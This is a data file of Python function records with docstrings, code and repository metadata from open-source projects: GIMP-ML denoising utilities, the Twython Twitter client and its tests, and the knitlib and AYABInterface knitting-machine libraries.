{"docstring": "'''\nDescription: To refine the estimated noise level maps\n[Input] the noise map tensor, and a refinement mode\nMode:\n[0] Get the most salient (the most frequent estimated noise level)\n[1] Get the maximum value of noise level\n[2] Gaussian smooth the noise level map to make the regional estimation more smooth\n[3] Get the average maximum value of the noise level\n[5] Get the CDF thresholded value \n\n[Output] a refined map tensor with four channels\n'''\n#RF_tensor = NM_tensor.clone()  #get a clone version of NM tensor without changing the original one\n", "func_signal": "def level_refine(NM_tensor, ref_mode, chn=3,cFlag=False):\n", "code": "if ref_mode == 0 or ref_mode == 1 or ref_mode == 4 or ref_mode==5:  #if we use a single value for the map\n    if ref_mode == 0 or ref_mode == 4:\n        nl_list = get_salient_noise_in_maps(NM_tensor, 0., chn)\n        \n        if ref_mode == 4:  #half the estimation\n            nl_list = nl_list - nl_list\n        print(nl_list)\n    elif ref_mode == 1:\n        nl_list = get_max_noise_in_maps(NM_tensor, chn)\n    elif ref_mode == 5:\n        nl_list = get_cdf_noise_in_maps(NM_tensor, 0.999, chn)\n\n    noise_map = np.zeros((NM_tensor.shape[0], chn, NM_tensor.size()[2], NM_tensor.size()[3]))  #initialize the noise map before concatenating\n    for n in range(NM_tensor.shape[0]):    \n        noise_map[n,:,:,:] = np.reshape(np.tile(nl_list[n], NM_tensor.size()[2] * NM_tensor.size()[3]),\n                                      (chn, NM_tensor.size()[2], NM_tensor.size()[3]))\n    RF_tensor = torch.from_numpy(noise_map).type(torch.FloatTensor)\n    if torch.cuda.is_available() and not cFlag:\n        RF_tensor = Variable(RF_tensor.cuda(),volatile=True)\n    else:\n        RF_tensor = Variable(RF_tensor,volatile=True)\n\nelif ref_mode == 2:\n    RF_tensor = get_smooth_maps(NM_tensor, 10, 5)\nelif ref_mode == 3:\n    lb = get_salient_noise_in_maps(NM_tensor)\n    up = get_max_noise_in_maps(NM_tensor)\n    nl_list = ( lb + up ) * 0.5\n    noise_map = np.zeros((1, chn, NM_tensor.size()[2], NM_tensor.size()[3]))  #initialize the noise map before concatenating\n    noise_map[0, :, :, :] = np.reshape(np.tile(nl_list, NM_tensor.size()[2] * NM_tensor.size()[3]),\n                                      (chn, NM_tensor.size()[2], NM_tensor.size()[3]))\n    RF_tensor = torch.from_numpy(noise_map).type(torch.FloatTensor)\n    RF_tensor = Variable(RF_tensor.cuda(),volatile=True)\n\n\nreturn (RF_tensor, nl_list)", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "\"\"\"Internal stream request handling\"\"\"\n", "func_signal": "def _request(self, url, method='GET', params=None):\n", "code": "self.connected = True\nretry_counter = 0\n\nmethod = method.lower()\nfunc = getattr(self.client, method)\nparams, _ = _transparent_params(params)\n\ndef _send(retry_counter):\n    requests_args = {}\n    for k, v in self.client_args.items():\n        # Maybe this should be set as a class\n        # variable and only done once?\n        if k in ('timeout', 'allow_redirects', 'verify'):\n            requests_args[k] = v\n\n    while self.connected:\n        try:\n            if method == 'get':\n                requests_args['params'] = params\n            else:\n                requests_args['data'] = params\n\n            response = func(url, **requests_args)\n        except requests.exceptions.Timeout:\n            self.on_timeout()\n        else:\n            if response.status_code != 200:\n                self.on_error(response.status_code, response.content, response.headers)\n\n            if self.retry_count and \\\n               (self.retry_count - retry_counter) > 0:\n                time.sleep(self.retry_in)\n                retry_counter += 1\n                _send(retry_counter)\n\n            return response\n\nwhile self.connected:\n    response = _send(retry_counter)\n\n    for line in response.iter_lines(self.chunk_size):\n        if not self.connected:\n            break\n        if line:\n            try:\n                if is_py3:\n                    line = line.decode('utf-8')\n                data = json.loads(line)\n            except ValueError:  # pragma: no cover\n                self.on_error(response.status_code,\n                              'Unable to decode response, \\\n                              not valid JSON.')\n            else:\n                if self.on_success(data):  # pragma: no cover\n                    for message_type in self.handlers:\n                        if message_type in data:\n                            handler = getattr(self,\n                                              'on_' + message_type,\n                                              None)\n                            if handler \\\n                               and callable(handler) \\\n                               and not handler(data.get(message_type)):\n                                break\n\nresponse.close()", "path": "twython/twython/streaming/api.py", "commit_date": "2020-04-04 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test updating delivery settings fails because we don't have\na mobile number on the account\"\"\"\n", "func_signal": "def test_update_delivery_service(self):\n", "code": "self.assertRaises(TwythonError, self.api.update_delivery_service,\n                  device='none')", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test timeline of tweets authored by members of the\nspecified list succeeds\"\"\"\n", "func_signal": "def test_get_list_statuses(self):\n", "code": "self.api.get_list_statuses(slug=test_list_slug,\n                           owner_screen_name=test_list_owner_screen_name)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test returning list of accounts that contribute to the\nauthenticated user fails because we are not a Contributor account\"\"\"\n", "func_signal": "def test_get_contributors(self):\n", "code": "self.assertRaises(TwythonError, self.api.get_contributors,\n                  screen_name=screen_name)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test getting specific list succeeds\"\"\"\n", "func_signal": "def test_get_specific_list(self):\n", "code": "self.api.get_specific_list(slug=test_list_slug,\n                           owner_screen_name=test_list_owner_screen_name)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test returning ids of users the authenticated user and then a random\nuser are followed by succeeds\"\"\"\n", "func_signal": "def test_get_followers_ids(self):\n", "code": "self.api.get_followers_ids()\nself.api.get_followers_ids(screen_name='twitter')", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test getting list of users authenticated user then random user are\nfollowed by succeeds\"\"\"\n", "func_signal": "def test_get_followers_list(self):\n", "code": "self.api.get_followers_list()\nself.api.get_followers_list(screen_name='twitter')", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test list of subscribers of a specific list succeeds\"\"\"\n", "func_signal": "def test_get_list_subscribers(self):\n", "code": "self.api.get_list_subscribers(slug=test_list_slug,\n                              owner_screen_name=test_list_owner_screen_name)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test returning ids of users the authenticated user and then a random\nuser is following succeeds\"\"\"\n", "func_signal": "def test_get_friends_ids(self):\n", "code": "self.api.get_friends_ids()\nself.api.get_friends_ids(screen_name='twitter')", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test getting list of saved searches for authenticated\nuser succeeds\"\"\"\n", "func_signal": "def test_create_get_destroy_saved_search(self):\n", "code": "saved_search = self.api.create_saved_search(query='#Twitter')\nsaved_search_id = saved_search['id_str']\n\nself.api.show_saved_search(id=saved_search_id)\nself.api.destroy_saved_search(id=saved_search_id)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test getting list of users authenticated user then random user is\nfollowing succeeds\"\"\"\n", "func_signal": "def test_get_friends_list(self):\n", "code": "self.api.get_friends_list()\nself.api.get_friends_list(screen_name='twitter')", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test listing members of the specified list succeeds\"\"\"\n", "func_signal": "def test_get_list_members(self):\n", "code": "self.api.get_list_members(slug=test_list_slug,\n                          owner_screen_name=test_list_owner_screen_name)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test creating and destroying a favorite on a tweet succeeds\"\"\"\n", "func_signal": "def test_create_and_destroy_favorite(self):\n", "code": "self.api.create_favorite(id=test_tweet_id)\nself.api.destroy_favorite(id=test_tweet_id)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test returning if specified user is member of a list succeeds\"\"\"\n# Returns 404 if not list member\n", "func_signal": "def test_is_list_member(self):\n", "code": "self.api.is_list_member(slug=test_list_slug,\n                        owner_screen_name=test_list_owner_screen_name,\n                        screen_name='themattharris')", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test updating friendships succeeds\"\"\"\n", "func_signal": "def test_update_friendship(self):\n", "code": "self.api.update_friendship(screen_name=protected_twitter_1,\n                           retweets='true')\n\nself.api.update_friendship(screen_name=protected_twitter_1,\n                           retweets=False)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test returning a protected user timeline who you are not following\nfails and raise a TwythonAuthError\"\"\"\n", "func_signal": "def test_get_protected_user_timeline_not_following(self):\n", "code": "self.assertRaises(TwythonAuthError, self.api.get_user_timeline,\n                  screen_name=protected_twitter_2)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test subscribing, is a list sub and unsubbing to list succeeds\"\"\"\n", "func_signal": "def test_subscribe_is_subbed_and_unsubscribe_to_list(self):\n", "code": "self.api.subscribe_to_list(slug=test_list_slug,\n                           owner_screen_name=test_list_owner_screen_name)\n# Returns 404 if user is not a subscriber\nself.api.is_list_subscriber(slug=test_list_slug,\n                            owner_screen_name=test_list_owner_screen_name,\n                            screen_name=screen_name)\nself.api.unsubscribe_from_list(slug=test_list_slug,\n                               owner_screen_name=test_list_owner_screen_name)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test updating and deleting a status succeeds\"\"\"\n", "func_signal": "def test_update_and_destroy_status(self):\n", "code": "status = self.api.update_status(status='Test post just to get \\\n            deleted :( %s' % int(time.time()))\nself.api.destroy_status(id=status['id_str'])", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test returning timeline for authenticated user and random user\nsucceeds\"\"\"\n", "func_signal": "def test_get_user_timeline(self):\n", "code": "self.api.get_user_timeline()  # Authenticated User Timeline\nself.api.get_user_timeline(screen_name='twitter')\n# Random User Timeline", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test create a list, adding and removing members then\ndeleting the list succeeds\"\"\"\n", "func_signal": "def test_create_update_destroy_list_add_remove_list_members(self):\n", "code": "the_list = self.api.create_list(name='Stuff %s' % int(time.time()))\nlist_id = the_list['id_str']\n\nself.api.update_list(list_id=list_id, name='Stuff Renamed \\\n                     %s' % int(time.time()))\n\nscreen_names = ['johncena', 'xbox']\n# Multi add/delete members\nself.api.create_list_members(list_id=list_id,\n                             screen_name=screen_names)\nself.api.delete_list_members(list_id=list_id,\n                             screen_name=screen_names)\n\n# Single add/delete member\nself.api.add_list_member(list_id=list_id, screen_name='justinbieber')\nself.api.delete_list_member(list_id=list_id,\n                            screen_name='justinbieber')\n\nself.api.delete_list(list_id=list_id)", "path": "twython/tests/test_endpoints.py", "commit_date": "2017-10-11 00:00:00", "repo_name": "ryanmcgrath/twython", "stars": 1848, "license": "mit", "language": "python", "size": 2801}
{"docstring": "\"\"\"Test on sending a start message to the controller.\"\"\"\n", "func_signal": "def test_req_start(self):\n", "code": "start_val, end_val = 0, 10\nself.comm_dummy.req_start(start_val, end_val)\nbyte_array = bytearray([0x01, start_val, end_val, 0x0a, 0x0d])\nbytes_read = self.dummy_serial.read(len(byte_array))\nself.assertEqual(bytes_read, byte_array)", "path": "knitlib/tests/test_ayab_communication.py", "commit_date": "2015-08-16 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Returns a JSON schema dict with the available features for the given machine plugin.\"\"\"\n", "func_signal": "def supported_config_features():\n", "code": "raise NotImplementedError(BaseKnittingPlugin.__NOT_IMPLEMENTED_ERROR.format(\n    \"supported_config_features must be defined. It returns a JSON Schema with available configuration options.\"))", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Sets a port name before configuration method.\"\"\"\n", "func_signal": "def set_port(self, portname):\n", "code": "raise NotImplementedError(self.__NOT_IMPLEMENTED_ERROR.format(\n    \"set_port must be defined.\"))", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Callback when state machine executes knit().\n\nStarts the knitting process, this is the only function call that can block indefinitely, as it is called from an instance\nof an individual Thread, allowing for processes that require timing and/or blocking behaviour.\n\"\"\"\n", "func_signal": "def onknit(self, e):\n", "code": "raise NotImplementedError(\n    self.__NOT_IMPLEMENTED_ERROR.format(\"onknit. It is used for the main 'knitting loop'.\"))", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"\nReturn an array containing the memo\ninformation for the pattern currently in memory\n\"\"\"\n", "func_signal": "def getMemo(self):\n", "code": "patt = self.patternNumber()\nif patt > 900:\n    return self.getPatternMemo(patt)\nelse:\n    pass\n    # rows = 0 # TODO XXXXXXXXX\nreturn [0]", "path": "knitlib/src/knitlib/plugins/pdd_plugin/brother.py", "commit_date": "2015-07-17 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Serves to register a dict of callbacks that require interaction by the User,\n\n Interactive callbacks serve to block operation until a human acts on them. Interactive callbacks can include\n physical operations (set needles, move knob, flip switch), decisions (yes/no or cancel), or simply human\n acknowledgement.\n\n Args:\n    callbacks: keys can be info, warning, progress, error.\n\n \"\"\"\n", "func_signal": "def register_interactive_callbacks(self, callbacks=None):\n", "code": "if callbacks is None:\n    callbacks = {}\nself.interactive_callbacks = callbacks", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Callback when state machine executes finish().\n\nWhen finish() gets called, the plugin is expected to be able to restore it's state back when configure() gets called.\nFinish should trigger a Process Completed notification so the user can operate accordingly.\n\"\"\"\n", "func_signal": "def onfinish(self, e):\n", "code": "raise NotImplementedError(\n    self.__NOT_IMPLEMENTED_ERROR.format(\"onfinish. It is a callback that is called when knitting is over.\"))", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"\nReturn an array containing the memo\ninformation for a custom pattern. The array\nis the same length as the number of rows\nin the pattern.\n\"\"\"\n", "func_signal": "def getPatternMemo(self, patternNumber):\n", "code": "list = self.getPatterns(patternNumber)\nif len(list) == 0:\n    return None\nmemos = array('B')\nmemoOff = list[0]['memo']\nrows = list[0]['rows']\nmemlen = roundeven(rows) / 2\n# memo is padded to en even byte\nfor i in range(memoOff, memoOff - memlen, -1):\n    msn, lsn = nibbles(self.data[i])\n    memos.append(lsn)\n    rows = rows - 1\n    if (rows):\n        memos.append(msn)\n        rows = rows - 1\nreturn memos", "path": "knitlib/src/knitlib/plugins/pdd_plugin/brother.py", "commit_date": "2015-07-17 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Tests that dummy plugin flows as expected in ideal conditions.\"\"\"\n", "func_signal": "def test_dummy_plugin():\n", "code": "knit_machine = dummy_plugin.DummyKnittingPlugin()\nknit_machine.configure(None)\nknit_machine.knit()\nknit_machine.finish()", "path": "knitlib/tests/test_knitting_plugin.py", "commit_date": "2015-06-29 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"\nReturn an array containing the pattern\ninformation for a pattern.\n\"\"\"\n", "func_signal": "def getPattern(self, patternNumber):\n", "code": "list = self.getPatterns(patternNumber)\nif len(list) == 0:\n    return None\npattern = []\n\npatoff = list[0]['pattern']\nrows = list[0]['rows']\nstitches = list[0]['stitches']\n\n# print 'patoff = 0x%04X' % patoff\n# print 'rows = ', rows\n# print 'stitches = ', stitches\nfor i in range(0, rows):\n    arow = self.getRowData(patoff, stitches, i)\n    # print arow\n    pattern.append(arow)\nreturn pattern", "path": "knitlib/src/knitlib/plugins/pdd_plugin/brother.py", "commit_date": "2015-07-17 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Test on closing serial port communication.\"\"\"\n", "func_signal": "def test_close_serial(self):\n", "code": "before = self.dummy_serial.isOpen()\nassert before\nself.comm_dummy.close_serial()\nafter = self.dummy_serial.isOpen()\nassert after == False", "path": "knitlib/tests/test_ayab_communication.py", "commit_date": "2015-08-16 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "# print '0x%02X' % ord(achar)\n", "func_signal": "def nibbles(achar):\n", "code": "msn = (ord(achar) & 0xF0) >> 4\nlsn = ord(achar) & 0x0F\nreturn msn, lsn", "path": "knitlib/src/knitlib/plugins/pdd_plugin/brother.py", "commit_date": "2015-07-17 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Callback when state machine executes configure(conf={})\n\nThis state gets called to configure the plugin for knitting. It can either\nbe called when first configuring the plugin, when an error happened and a\nreset is necessary.\n\nArgs:\n  e: An event object holding a conf dict.\n\"\"\"\n", "func_signal": "def onconfigure(self, e):\n", "code": "raise NotImplementedError(self.__NOT_IMPLEMENTED_ERROR.format(\n    \"onconfigure. It is used to configure the knitting plugin before starting.\"))", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "# nibbles is zero based\n", "func_signal": "def getIndexedNibble(self, offset, nibble):\n", "code": "bytes = nibble / 2\nm, l = nibbles(self.data[offset - bytes])\nif nibble % 2:\n    return m\nelse:\n    return l", "path": "knitlib/src/knitlib/plugins/pdd_plugin/brother.py", "commit_date": "2015-07-17 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Returns a list of tuples of the available plugins and type.\"\"\"\n", "func_signal": "def get_active_machine_plugins_names():\n", "code": "active_plugins = []\nfor plugin_type, plugins_by_type in plugins.active_plugins.items():\n  for plugin_name, plugin_class in plugins_by_type.items():\n    active_plugins.append(plugin_name)\nreturn active_plugins", "path": "knitlib/src/knitlib/machine_handler.py", "commit_date": "2015-07-13 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Capturing raw_input to block CLI action.\"\"\"\n# TODO: use appropriate logging level for message.\n", "func_signal": "def __cli_blocking_action(message, level=\"info\"):\n", "code": "logging.info(message)\nraw_input()", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Test on Sending a request for information to controller.\"\"\"\n", "func_signal": "def test_req_info(self):\n", "code": "self.comm_dummy.req_info()\nbyte_array = bytearray([0x03, 0x0a, 0x0d])\nbytes_read = self.dummy_serial.read(len(byte_array))\nassert bytes_read == byte_array", "path": "knitlib/tests/test_ayab_communication.py", "commit_date": "2015-08-16 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Test on sending a line of data via the serial port.\"\"\"\n", "func_signal": "def test_cnf_line(self):\n", "code": "lineNumber = 13\nlineData   = chr(0xAB)\nflags      = 0x12\ncrc8       = 0x57\nself.comm_dummy.cnf_line(lineNumber, lineData, flags, crc8)\nbyte_array = bytearray([0x42, lineNumber, lineData, flags, crc8, 0x0a, 0x0d])\nbytes_read = self.dummy_serial.read(len(byte_array))\nassert bytes_read == byte_array", "path": "knitlib/tests/test_ayab_communication.py", "commit_date": "2015-08-16 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Returns a machine plugin given the machine_id class name.\"\"\"\n", "func_signal": "def get_machine_plugin_by_id(machine_id, if_not_found=None):\n", "code": "for k, v in plugins.active_plugins.items():\n  if machine_id in v:\n    return v[machine_id]\nreturn if_not_found", "path": "knitlib/src/knitlib/machine_handler.py", "commit_date": "2015-07-13 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Interactive callbacks handle Plugin-Frontend interaction hooks.\"\"\"\n", "func_signal": "def __init__(self, callbacks_dict=None, interactive_callbacks=None):\n", "code": "self.interactive_callbacks = {}\n\n# Are we running on CLI or knitlib web?\n# If no callbacks are registered, we set a CLI set as default.\nif interactive_callbacks is None:\n    self.register_interactive_callbacks({\n        \"blocking_user_action\": BaseKnittingPlugin.__cli_blocking_action,\n        \"message\": BaseKnittingPlugin.__cli_emit_message,\n        \"progress\": BaseKnittingPlugin.__cli_log_progress\n    })\nelse:\n    self.register_interactive_callbacks(interactive_callbacks)\n\n# Fysom allows to set hooks before changing states, we set them here.\nif callbacks_dict is None:\n    callbacks_dict = {\n        'onknit': self.onknit,\n        'onconfigure': self.onconfigure,\n        'onfinish': self.onfinish,\n    }\nFysom.__init__(self, {\n    'initial': 'activated',\n    'events': [  # TODO: add more states for handling error management.\n                 {'name': 'configure', 'src': 'activated', 'dst': 'configured'},\n                 {'name': 'configure', 'src': 'configured', 'dst': 'configured'},\n                 {'name': 'configure', 'src': 'finished', 'dst': 'configured'},\n                 {'name': 'configure', 'src': 'error', 'dst': 'configured'},\n                 {'name': 'knit', 'src': 'configured', 'dst': 'knitting'},\n                 {'name': 'finish', 'src': 'knitting', 'dst': 'finished'},\n                 {'name': 'finish', 'src': 'finished', 'dst': 'finished'},\n                 {'name': 'fail', 'src': 'knitting', 'dst': 'error'}],\n    'callbacks': callbacks_dict\n})", "path": "knitlib/src/knitlib/plugins/knitting_plugin.py", "commit_date": "2015-08-21 00:00:00", "repo_name": "fossasia/knitlib", "stars": 1540, "license": "lgpl-3.0", "language": "python", "size": 224}
{"docstring": "\"\"\"Return the row at the given index or the default value.\"\"\"\n", "func_signal": "def get_row(self, index, default=None):\n", "code": "if not isinstance(index, int) or index < 0 or index >= len(self._rows):\n    return default\nreturn self._rows[index]", "path": "AYABInterface/AYABInterface/needle_positions.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Send a host message.\n\n:param type host_message_class: a subclass of\n  :class:`AYABImterface.communication.host_messages.Message`\n:param args: additional arguments that shall be passed to the\n  :paramref:`host_message_class` as arguments\n\"\"\"\n", "func_signal": "def send(self, host_message_class, *args):\n", "code": "message = host_message_class(self._file, self, *args)\nwith self.lock:\n    message.send()\n    for callable in self._on_message:\n        callable(message)", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Create the \"is_*\" functions for the Actions.\"\"\"\n", "func_signal": "def _new_test(name, container, result, clsname):\n", "code": "def test(self):\n    return result\ntest.__name__ = name\ntest.__qualname__ = container.__qualname__ + \".\" + name\ntest.__doc__ = _doc_base.format(clsname, result)\nsetattr(container, name, test)", "path": "AYABInterface/AYABInterface/actions.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Convert the needle positions to the wire format.\n\nThis conversion is used for :ref:`cnfline`.\n\n:param needle_positions: an iterable over :attr:`needle_positions` of\n  length :attr:`number_of_needles`\n:rtype: bytes\n\"\"\"\n", "func_signal": "def needle_positions_to_bytes(self, needle_positions):\n", "code": "bit = self.needle_positions\nassert len(bit) == 2\nmax_length = len(needle_positions)\nassert max_length == self.number_of_needles\nresult = []\nfor byte_index in range(0, max_length, 8):\n    byte = 0\n    for bit_index in range(8):\n        index = byte_index + bit_index\n        if index >= max_length:\n            break\n        needle_position = needle_positions[index]\n        if bit.index(needle_position) == 1:\n            byte |= 1 << bit_index\n    result.append(byte)\n    if byte_index >= max_length:\n        break\nresult.extend(b\"\\x00\" * (25 - len(result)))\nreturn bytes(result)", "path": "AYABInterface/AYABInterface/machines.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Receive a message from the file.\"\"\"\n", "func_signal": "def receive_message(self):\n", "code": "with self.lock:\n    assert self.can_receive_messages()\n    message_type = self._read_message_type(self._file)\n    message = message_type(self._file, self)\n    self._message_received(message)", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Set the state.\"\"\"\n", "func_signal": "def state(self, new_state):\n", "code": "with self.lock:\n    self._state.exit()\n    self._state = new_state\n    self._state.enter()", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"The identifier of the machine.\"\"\"\n", "func_signal": "def name(self):\n", "code": "name = self.__class__.__name__\nfor i, character in enumerate(name):\n    if character.isdigit():\n        return name[:i] + \"-\" + name[i:]\nreturn name", "path": "AYABInterface/AYABInterface/machines.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Return the cnfLine content without id for the line.\n\n:param int line_number: the number of the line\n:rtype: bytes\n:return: a cnfLine message without id as defined in :ref:`cnfLine`\n\"\"\"\n", "func_signal": "def get_line_configuration_message(self, line_number):\n", "code": "if line_number not in self._line_configuration_message_cache:\n    line_bytes = self.get_bytes(line_number)\n    if line_bytes is not None:\n        line_bytes = bytes([line_number & 255]) + line_bytes\n        line_bytes += bytes([self.is_last(line_number)])\n        line_bytes += crc8(line_bytes).digest()\n    self._line_configuration_message_cache[line_number] = line_bytes\n    del line_bytes\nline = self._line_configuration_message_cache[line_number]\nif line is None:\n    # no need to cache a lot of empty lines\n    line = (bytes([line_number & 255]) +\n            b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' +\n            b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01')\n    line += crc8(line).digest()\nreturn line", "path": "AYABInterface/AYABInterface/communication/cache.py", "commit_date": "2016-08-01 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
